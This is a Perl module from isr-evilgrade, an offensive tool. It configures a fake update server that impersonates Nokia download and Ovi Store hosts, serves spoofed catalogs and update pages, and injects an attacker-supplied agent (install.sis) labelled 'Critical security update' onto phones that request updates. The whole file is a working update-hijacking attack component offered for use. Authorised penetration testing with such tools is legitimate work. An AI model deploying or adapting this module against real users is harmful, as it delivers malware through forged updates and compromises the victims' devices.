###############
# nokia.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::nokia;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'        => 'nokia',
    'version'     => '1.0',
    'appver'      => '< 3.1.736 (nokia firmware v20.2.011)',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>'],
    'description' => qq{},

    #http://cgw.download.nokia.com/ntp-cgw/catalogs/
    'vh' =>
        '(config.preminetsolution.com|cgw.download.nokia.com|store.ovi.mobi)',
    'request' => [
        {   'req'    => '^/$',                    #regex friendly #10.0
            'type'   => 'file',                   #file|string|agent|install
            'method' => '',                       #any
            'bin'    => 0,
            'string' => "",
            'parse'  => 0,
            'file'   => './include/nokia/req1',
        },
        {   'req'    => '/ntp-cgw/catalogs/',       #regex friendly #10.0
            'type'   => 'file',                     #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 0,
            'string' => "",
            'parse'  => 0,
            'file'   => './include/nokia/catalog',
        },
        {   'req'    => '/\?cid\=ovistore',         #regex friendly #10.0
            'type'   => 'file',                     #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 0,
            'string' => "",
            'parse'  => 0,
            'file' => './include/nokia/update.html',
        },
        {   'req'    => '/ovi.png',                 #regex friendly #10.0
            'type'   => 'file',                     #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => "",
            'parse'  => 0,
            'file'   => './include/nokia/ovi.png',
        },
        {   'req'    => '/favicon.ico',             #regex friendly #10.0
            'type'   => 'file',                     #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => "",
            'parse'  => 0,
            'file'   => './include/nokia/ovi.ico',
        },

        {   'req'    => '/style.css',               #regex friendly #10.0
            'type'   => 'file',                     #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 0,
            'string' => "",
            'parse'  => 0,
            'file'   => './include/nokia/style.css',
        },

        ## Agent install
        {   'req'    => '/j2me.jad',                #regex friendly #10.0
            'type'   => 'file',                     #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => "",
            'parse'  => 0,
            'file'   => './include/nokia/j2me.jad',
        },

        {   'req'    => '/j2me.jar',                #regex friendly #10.0
            'type'   => 'file',                     #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => "",
            'parse'  => 0,
            'file'   => './include/nokia/j2me.jar',
        },

        {   'req'    => '.sis',                     #regex friendly
            'type'   => 'agent',                    #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => '',
            'parse'  => 0,
            'file'   => ''
        },

        {   'req'    => '/JarInstallNotify',        #regex friendly #10.0
            'type'   => 'install',                  #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => "",
            'parse'  => 0,
            'file'   => './include/nokia/ovi.ico',
        },

    ],

    #Options
    'options' => {
        'agent' => {
            'val'  => './include/nokia/install.sis',
            'desc' => 'Agent to inject'
        },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'description' => {
            'val'  => 'Critical security update',
            'desc' => 'Description display in the update'
        },
        'version' => {
            'val' =>
                '\'30.\'.isrcore::utils::RndNum(1).\'.\'.isrcore::utils::RndNum(4).\'.\'.isrcore::utils::RndNum(1)',
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'rnd1' => {
            'val'     => 'isrcore::utils::RndNum(5)',
            'hidden'  => 1,
            'dynamic' => 1,
        }
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
